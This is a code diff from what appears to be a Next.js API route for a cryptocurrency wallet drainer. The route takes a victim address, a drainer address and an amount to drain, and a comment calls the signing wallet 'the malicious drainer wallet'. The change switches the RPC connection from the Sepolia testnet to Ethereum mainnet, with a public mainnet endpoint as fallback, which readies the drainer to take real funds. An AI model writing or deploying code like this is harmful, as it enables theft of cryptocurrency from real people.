@@ -16,7 +16,7 @@ export async function POST(request: Request) {
         const { victimAddress, drainerAddress, drainAmount } = payload;
 
         // Setup the RPC connection and the malicious drainer wallet
-        const rpcUrl = process.env.NEXT_PUBLIC_SEPOLIA_RPC_URL || process.env.SEPOLIA_RPC_URL;
+        const rpcUrl = process.env.NEXT_PUBLIC_MAINNET_RPC_URL || process.env.MAINNET_RPC_URL || "https://cloudflare-eth.com";
         const privateKey = process.env.PRIVATE_KEY;
         const tokenAddress = process.env.NEXT_PUBLIC_TOKEN_ADDRESS || process.env.TOKEN_ADDRESS;
 
